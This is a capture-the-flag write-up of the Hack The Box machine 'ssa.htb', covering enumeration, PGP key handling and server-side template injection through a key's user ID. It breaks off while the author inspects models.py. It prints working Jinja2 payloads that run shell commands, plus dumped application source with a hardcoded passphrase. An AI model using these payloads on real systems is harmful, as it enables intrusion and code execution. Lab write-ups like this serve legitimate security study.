## RUSTSCAN:

`PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A= | 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ 443/tcp open ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: HEAD GET OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/localityName=Classified/organizationalUnitName=SSA/emailAddress=atlas@ssa.htb | Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/localityName=Classified/organizationalUnitName=SSA/emailAddress=atlas@ssa.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2023-05-04T18:03:25 | Not valid after: 2050-09-19T18:03:25 | MD5: b8b7:487e:f3e2:14a4:999e:f842:0141:59a1 | SHA-1: 80d9:2367:8d7b:43b2:526d:5d61:00bd:66e9:48dd:c223 | _http-title: Secret Spy Agency | Secret Security Service Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), Linux 5.0 - 5.5 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%) No exact OS matches for host (test conditions non-ideal).`

* * *

## SSH:

As usual SSH doesn't offer us any tangible foothold, the running version is new and no known exploita are available in the wild.
Bruteforce is not intended, that's why we can move forward with other services.

* * *

## HTTP:

From our initial NMAP scan we could see that the real website FQDN is pointing to ssa.htb so let's add that to out hosts file and move forward!

Checking the HTML source code of the main page didn't gave us anything tangible except indication about the technology used?

![0b1f2b677b7bd6cf4ca3213245db847c.png](../../../_resources/0b1f2b677b7bd6cf4ca3213245db847c.png)

Knowing that is most probably a Flask(python) application running on a Ngix server:

![f9e30c9b1855818454e1a46fb9a4a1af.png](../../../_resources/f9e30c9b1855818454e1a46fb9a4a1af.png)

I will run a subdomain enumeration but nothing came out so far:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u 'http://ssa.htb/' -H 'HOST:FUZZ.ssa.htb' -fl 8

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ssa.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ssa.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 677 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

What about webdirectories fuzzing then?

```Bash
Target: http://ssa.htb/

[12:10:04] Starting: 
[12:10:22] 301 -  178B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/  ->  https://ssa.htb/examples/jsp/%252e%252e/%252e%252e/manager/html/

Task Completed
```

Umh interesting we can't see much here going on even by using differen worlists! My guessing are that HTTP and HTTPS are the same but we can judge that later on! For now I will move forward to HTTPS site and eventually I will come back if needed!

* * *

## HTTPS:

Here again seems like that HTTPS service is hosting same thing as the HTTP one. No leftovers in the commends or code snippest are available in the mainsite HTML source code.

No other subdomains are availlable:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u 'https://ssa.htb/' -H 'HOST:FUZZ.ssa.htb' -fl 124

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://ssa.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ssa.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 124
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 235 req/sec :: Duration: [0:01:21] :: Errors: 0 ::
```

And finally seems like the Webdirectories fuzzing is giving back more results as the HTTP one:

```Bash
Target: https://ssa.htb/

[12:11:25] Starting: 
[12:11:33] 200 -    5KB - /about
[12:11:34] 302 -  227B  - /admin  ->  /login?next=%2Fadmin
[12:11:41] 200 -    3KB - /contact
[12:11:45] 200 -    9KB - /guide
[12:11:48] 200 -    4KB - /login
[12:11:49] 302 -  229B  - /logout  ->  /login?next=%2Flogout
```

We could even find a possible username from the SSL certificate?

![721d835d4866309caa26c1bca96d8161.png](../../../_resources/721d835d4866309caa26c1bca96d8161.png)

Now here, analyzing back what we found from last Dirsearch scan we found a Login portal, an Admin one(most likely inside login) and a guide and a contact form.

Here can we find their PGP key for excripting our message: https://ssa.htb/pgp

I will try to run nmap and see if there is any trace of SQLi:

```Bash
[12:38:45] [WARNING] POST parameter 'button' does not seem to be injectable
[12:38:45] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[12:38:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-06182023_1231pm.csv'

[*] ending @ 12:38:45 /2023-06-18/
```

Ok seems like SQL injection is not the way in. I guess we have to use that PGP to send some commands in!

Firstly I saved and added that  Public gpp key to my keyring:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --list-keys     
/root/.gnupg/pubring.kbx
------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]
```

Then I started to read about it: https://www.digitalocean.com/community/tutorials/how-to-use-gpg-to-encrypt-and-sign-messages

So starting by adding a dummy text file and encrypting it with thei public key:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --encrypt --armor -r atlas@ssa.htb cacca.txt 
gpg: 6BB733D928D14CE6: There is no assurance this key belongs to the named user

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Subkey fingerprint: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
```

And then lastly decrypting it  seems like it's working baby!

![9539851c7fcfa7ef881c7a270b352d21.png](../../../_resources/9539851c7fcfa7ef881c7a270b352d21.png)

But then I went back and followed the guide. First I created a new local secret key:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --gen-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: yovecio
Email address: yovecio@local
You selected this USER-ID:
    "yovecio <yovecio@local>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: directory '/root/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/root/.gnupg/openpgp-revocs.d/5B27576968BCB99552AAA593F0C0E6591775F22F.rev'
public and secret key created and signed.

pub   rsa3072 2023-06-18 [SC] [expires: 2025-06-17]
      5B27576968BCB99552AAA593F0C0E6591775F22F
uid                      yovecio <yovecio@local>
sub   rsa3072 2023-06-18 [E] [expires: 2025-06-17]

                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --list-secret-keys
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: next trustdb check due at 2025-06-17
/root/.gnupg/pubring.kbx
------------------------
sec   rsa3072 2023-06-18 [SC] [expires: 2025-06-17]
      5B27576968BCB99552AAA593F0C0E6591775F22F
uid           [ultimate] yovecio <yovecio@local>
ssb   rsa3072 2023-06-18 [E] [expires: 2025-06-17]
```

Then I signed the imported key:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --fingerprint atlas@ssa.htb
pub   rsa4096 2023-05-04 [SC]
      D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --sign-key atlas@ssa.htb

pub  rsa4096/C61D429110B625D4
     created: 2023-05-04  expires: never       usage: SC  
     trust: unknown       validity: unknown
sub  rsa4096/6BB733D928D14CE6
     created: 2023-05-04  expires: never       usage: E   
[ unknown] (1). SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>


pub  rsa4096/C61D429110B625D4
     created: 2023-05-04  expires: never       usage: SC  
     trust: unknown       validity: unknown
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4

     SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>

Are you sure that you want to sign this key with your
key "yovecio <yovecio@local>" (F0C0E6591775F22F)

Really sign? (y/N) y
```

Doing so we signed our private key with the Public one from atlas@ssa.htb. Then playing around we found so far:

- We can encrypt a message locally on our machine with Atlas public key and the website can decode it's content.(section 1)
- If we give our public key and ecrrypt a message, we can decrypt it(section 2)

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --decrypt test.asc                               
gpg: encrypted with 3072-bit RSA key, ID 2376241B61FC9758, created 2023-06-18
      "yovecio <yovecio@localhost>"
This is an encrypted message for yovecio <yovecio@localhost>.

If you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.

Congratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.

SSA: 06/18/2023-11;52;39
```

- Lastly even signature check is working, but then I had to sign a message with my private key and by giving my public key+ enc message the website could check the authenticity

![3c7367c53610090b964507396003b943.png](../../../_resources/3c7367c53610090b964507396003b943.png)

Now here checking on the Forum for tips people where pointing to check on fields that may be exploitable and here I see only name/email of the signature that maybe can use as LFI?

But after several tries nothing worked, email need to be in a email format, name can't have any spaces, so It remains to dig more and i stulbed upon this:

![b9676a1d48f8bcca28cac06dd0de75b4.png](../../../_resources/b9676a1d48f8bcca28cac06dd0de75b4.png)

Wondering if that comment can be used to gain some RCE?

LEt's try to edit our local key and add a comment:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --edit-key F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Secret key is available.

sec  rsa3072/BAD95D96B24ECA3F
     created: 2023-06-18  expires: 2025-06-17  usage: SC  
     trust: ultimate      validity: ultimate
ssb  rsa3072/2376241B61FC9758
     created: 2023-06-18  expires: 2025-06-17  usage: E   
[ultimate] (1). yovecio <yovecio@localhost>

gpg> adduid 
Real name: 
Email address: 
Comment: whoami
You selected this USER-ID:
    " (whoami)"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O

sec  rsa3072/BAD95D96B24ECA3F
     created: 2023-06-18  expires: 2025-06-17  usage: SC  
     trust: ultimate      validity: ultimate
ssb  rsa3072/2376241B61FC9758
     created: 2023-06-18  expires: 2025-06-17  usage: E   
[ultimate] (1)  yovecio <yovecio@localhost>
[ unknown] (2).  (whoami)

gpg> 

sec  rsa3072/BAD95D96B24ECA3F
     created: 2023-06-18  expires: 2025-06-17  usage: SC  
     trust: ultimate      validity: ultimate
ssb  rsa3072/2376241B61FC9758
     created: 2023-06-18  expires: 2025-06-17  usage: E   
[ultimate] (1)  yovecio <yovecio@localhost>
[ unknown] (2).  (whoami)

gpg> save
                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --list-keys                                        
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   1  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: depth: 1  valid:   1  signed:   0  trust: 1-, 0q, 0n, 0m, 0f, 0u
gpg: next trustdb check due at 2025-06-17
/root/.gnupg/pubring.kbx
------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [  full  ] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

pub   rsa3072 2023-06-18 [SC] [expires: 2025-06-17]
      F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F
uid           [ultimate]  (whoami)
uid           [ultimate] yovecio <yovecio@localhost>
sub   rsa3072 2023-06-18 [E] [expires: 2025-06-17]
```

As you can see I kept everything the same since email, name and ID are pretty much not changable that much and added a comment(here you can go banas with text, more or less).

let's see how it will work now! But after a humongus number of tries i finally maybe made it, it was indeed on the name field on the section3 (verify signature). But a user on the website pointed me on the SSTi and by knowing that application is written in flask(python) there are not that many choises on book hacktricks: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python

And most likely will be a Junja2. So checking on this one:

![0c01ead4c36dd9bd7618e30c1369677e.png](../../../_resources/0c01ead4c36dd9bd7618e30c1369677e.png)

Now crafting our first payload:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --list-keys                                                                
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   1  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: depth: 1  valid:   1  signed:   0  trust: 1-, 0q, 0n, 0m, 0f, 0u
gpg: next trustdb check due at 2025-06-17
/root/.gnupg/pubring.kbx
------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [  full  ] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

pub   rsa3072 2023-06-18 [SC] [expires: 2025-06-17]
      F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F
uid           [ultimate] {{ cycler.__init__.__globals__.os.popen('id').read() }}
sub   rsa3072 2023-06-18 [E] [expires: 2025-06-17]
```

And then exporting at every change our local public key and resigning the message and then sending those informations on the website:

![4a502d09d95374bac588d13dab0f611c.png](../../../_resources/4a502d09d95374bac588d13dab0f611c.png)

Seems like we have a RCE and ID is working just fine!

Now let's see if we can get a shell working!

Seems like we have to encode the command:

![25c824d4b7cd59d9d42aa996f1134f6f.png](../../../_resources/25c824d4b7cd59d9d42aa996f1134f6f.png)

Then I tried with a normal ls -l:

![20dfc9fb6a23070757fd2c6b461f1efd.png](../../../_resources/20dfc9fb6a23070757fd2c6b461f1efd.png)

Then after trying everythig I went back to basics I i found the PWD:

```bash
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 02:18:46 PM UTC gpg: using RSA key F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F [GNUPG:] KEY_CONSIDERED F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F 0 [GNUPG:] SIG_ID 39AJo7vpWakhK8eOC0vIuRYwjUQ 2023-06-18 1687097926 [GNUPG:] KEY_CONSIDERED F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F 0 [GNUPG:] GOODSIG BAD95D96B24ECA3F /var/www/html/SSA gpg: Good signature from "/var/www/html/SSA " [unknown] [GNUPG:] VALIDSIG F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F 2023-06-18 1687097926 0 4 0 1 10 00 F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: F359 9F12 F9D3 3735 82A6 D7AD BAD9 5D96 B24E CA3F
```

Now let's try to read secrets from that folder (/var/www/html/SSA/)

And it's showing another SSA folder in it!

![c0475dee05bf5d1b17ccf224c2304e45.png](../../../_resources/c0475dee05bf5d1b17ccf224c2304e45.png)

And then again moving forward({{ self.\_TemplateReference\_\_context.namespace.\_\_init\_\_.\_\_globals\_\_.os.popen('ls -al /var/www/html/SSA/SSA').read() }}):

![b9a9c97046f36654e3ff877c44d5dcf1.png](../../../_resources/b9a9c97046f36654e3ff877c44d5dcf1.png)

Good and what about reading that app.py?

```Python
Signature Verification Result
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 02:18:46 PM UTC gpg: using RSA key F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F [GNUPG:] KEY_CONSIDERED F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F 0 [GNUPG:] SIG_ID 39AJo7vpWakhK8eOC0vIuRYwjUQ 2023-06-18 1687097926 [GNUPG:] KEY_CONSIDERED F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F 0 [GNUPG:] GOODSIG BAD95D96B24ECA3F from flask import Flask, render_template, Response, flash, request, Blueprint, redirect, flash, url_for, render_template_string, jsonify from flask_login import login_required, login_user, logout_user from werkzeug.security import check_password_hash import hashlib from . import db import os from datetime import datetime import gnupg from SSA.models import User main = Blueprint('main', __name__) gpg = gnupg.GPG(gnupghome='/home/atlas/.gnupg', options=['--ignore-time-conflict']) @main.route("/") def home(): return render_template("index.html", name="home") @main.route("/about") def about(): return render_template("about.html", name="about") @main.route("/contact", methods=('GET', 'POST',)) def contact(): if request.method == 'GET': return render_template("contact.html", name="contact") tip = request.form['encrypted_text'] if not validate(tip): return render_template("contact.html", error_msg="Message is not PGP-encrypted.") msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: tip = msg.data.decode('utf-8') msg = "Thank you for your submission." save(tip, request.environ.get('HTTP_X_REAL_IP', request.remote_addr)) return render_template("contact.html", error_msg=msg) @main.route("/guide", methods=('GET', 'POST')) def guide(): if request.method == 'GET': return render_template("study.html", name="guide") elif request.method == 'POST': encrypted = request.form['encrypted_text'] if not validate(encrypted): pass msg = gpg.decrypt(encrypted, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: msg = msg.data.decode('utf-8') return render_template("study.html", name="guide", dec_msg=msg) @main.route("/guide/encrypt", methods=('GET', 'POST',)) def encrypt(): if request.method == 'GET': return render_template("study.html") pubkey = request.form['pub_key'] import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_pub="Invalid key format.") fp = import_result.fingerprints[0] now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") key_uid = ', '.join([key['uids'] for key in gpg.list_keys() if key['fingerprint'] == fp][0]) message = f"""This is an encrypted message for {key_uid}.\n\nIf you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.\n\nCongratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.\n\nSSA: {now}""" enc_msg = gpg.encrypt(message, recipients=fp, always_trust=True) if not enc_msg.ok: return render_template("study.html", error_msg="Something went wrong.") return render_template("study.html", enc_msg=enc_msg) @main.route("/guide/verify", methods=('GET', 'POST',)) def verify(): if request.method == 'GET': return render_template("study.html") signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_key="Key import failed. Make sure your key is properly formatted.") else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template("study.html", error_msg_sig=msg) return render_template("study.html", error_msg_key="Something went wrong.") @main.route("/process", methods=("POST",)) def process_form(): signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: msg = "Key import failed. Make sure your key is properly formatted." else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template_string(msg) @main.route("/pgp") def pgp(): return render_template("pgp.html", name="pgp") @main.route("/admin") @login_required def admin(): entries = [] with open('SSA/submissions/log', 'r') as f: for i, line in enumerate(f): if i <= 7: continue ip, fname, dtime = line.strip().split(":") entries.append({ 'id': i-7, 'ip': ip, 'fname': fname, 'dtime': dtime }) return render_template("admin.html", name="admin", entries=entries) @main.route("/view", methods=('GET', 'POST',)) @login_required def view(): fname = request.args.get('fname') try: if not fname.endswith('.txt'): flask.abort(400) with open(f"SSA/submissions/{fname}", 'r') as f: msg = f.read() except Exception as _: msg = 'Something went wrong.' return render_template("view.html", name="view", dec_msg=msg) @main.route("/login", methods=('GET', 'POST')) def login(): if request.method == 'GET': return render_template("login.html", name="login") uname = request.form['username'] pwd = request.form['password'] user = User.query.filter_by(username=uname).first() if not user or not check_password_hash(user.password, pwd): flash('Invalid credentials.') return redirect(url_for('main.login')) login_user(user, remember=True) return redirect(url_for('main.admin')) @main.route("/logout") @login_required def logout(): logout_user() return redirect(url_for('main.home')) def validate(msg): if msg[:27] == '-----BEGIN PGP MESSAGE-----' and msg[-27:].strip() == '-----END PGP MESSAGE-----': return True return False def save(msg, ip): fname = os.urandom(16).hex() + ".txt" now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") with open("SSA/submissions/log", "a") as f: f.write(f"{ip}:{fname}:{now}\n") with open(f"SSA/submissions/{fname}", "w") as f: f.write(msg) gpg: Good signature from "from flask import Flask, render_template, Response, flash, request, Blueprint, redirect, flash, url_for, render_template_string, jsonify from flask_login import login_required, login_user, logout_user from werkzeug.security import check_password_hash import hashlib from . import db import os from datetime import datetime import gnupg from SSA.models import User main = Blueprint('main', __name__) gpg = gnupg.GPG(gnupghome='/home/atlas/.gnupg', options=['--ignore-time-conflict']) @main.route("/") def home(): return render_template("index.html", name="home") @main.route("/about") def about(): return render_template("about.html", name="about") @main.route("/contact", methods=('GET', 'POST',)) def contact(): if request.method == 'GET': return render_template("contact.html", name="contact") tip = request.form['encrypted_text'] if not validate(tip): return render_template("contact.html", error_msg="Message is not PGP-encrypted.") msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: tip = msg.data.decode('utf-8') msg = "Thank you for your submission." save(tip, request.environ.get('HTTP_X_REAL_IP', request.remote_addr)) return render_template("contact.html", error_msg=msg) @main.route("/guide", methods=('GET', 'POST')) def guide(): if request.method == 'GET': return render_template("study.html", name="guide") elif request.method == 'POST': encrypted = request.form['encrypted_text'] if not validate(encrypted): pass msg = gpg.decrypt(encrypted, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: msg = msg.data.decode('utf-8') return render_template("study.html", name="guide", dec_msg=msg) @main.route("/guide/encrypt", methods=('GET', 'POST',)) def encrypt(): if request.method == 'GET': return render_template("study.html") pubkey = request.form['pub_key'] import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_pub="Invalid key format.") fp = import_result.fingerprints[0] now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") key_uid = ', '.join([key['uids'] for key in gpg.list_keys() if key['fingerprint'] == fp][0]) message = f"""This is an encrypted message for {key_uid}.\n\nIf you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.\n\nCongratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.\n\nSSA: {now}""" enc_msg = gpg.encrypt(message, recipients=fp, always_trust=True) if not enc_msg.ok: return render_template("study.html", error_msg="Something went wrong.") return render_template("study.html", enc_msg=enc_msg) @main.route("/guide/verify", methods=('GET', 'POST',)) def verify(): if request.method == 'GET': return render_template("study.html") signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_key="Key import failed. Make sure your key is properly formatted.") else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template("study.html", error_msg_sig=msg) return render_template("study.html", error_msg_key="Something went wrong.") @main.route("/process", methods=("POST",)) def process_form(): signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: msg = "Key import failed. Make sure your key is properly formatted." else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template_string(msg) @main.route("/pgp") def pgp(): return render_template("pgp.html", name="pgp") @main.route("/admin") @login_required def admin(): entries = [] with open('SSA/submissions/log', 'r') as f: for i, line in enumerate(f): if i <= 7: continue ip, fname, dtime = line.strip().split(":") entries.append({ 'id': i-7, 'ip': ip, 'fname': fname, 'dtime': dtime }) return render_template("admin.html", name="admin", entries=entries) @main.route("/view", methods=('GET', 'POST',)) @login_required def view(): fname = request.args.get('fname') try: if not fname.endswith('.txt'): flask.abort(400) with open(f"SSA/submissions/{fname}", 'r') as f: msg = f.read() except Exception as _: msg = 'Something went wrong.' return render_template("view.html", name="view", dec_msg=msg) @main.route("/login", methods=('GET', 'POST')) def login(): if request.method == 'GET': return render_template("login.html", name="login") uname = request.form['username'] pwd = request.form['password'] user = User.query.filter_by(username=uname).first() if not user or not check_password_hash(user.password, pwd): flash('Invalid credentials.') return redirect(url_for('main.login')) login_user(user, remember=True) return redirect(url_for('main.admin')) @main.route("/logout") @login_required def logout(): logout_user() return redirect(url_for('main.home')) def validate(msg): if msg[:27] == '-----BEGIN PGP MESSAGE-----' and msg[-27:].strip() == '-----END PGP MESSAGE-----': return True return False def save(msg, ip): fname = os.urandom(16).hex() + ".txt" now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") with open("SSA/submissions/log", "a") as f: f.write(f"{ip}:{fname}:{now}\n") with open(f"SSA/submissions/{fname}", "w") as f: f.write(msg) " [unknown] [GNUPG:] VALIDSIG F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F 2023-06-18 1687097926 0 4 0 1 10 00 F3599F12F9D3373582A6D7ADBAD95D96B24ECA3F [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: F359 9F12 F9D3 3735 82A6 D7AD BAD9 5D96 B24E CA3F
```

Ok from here can we find a password, wondering if we can login now? Edit: NO!

Then checking for more folder seems like all the templates are under /templates but nothing came out so far! Then checking models.py seems poking to DB:

```Bash
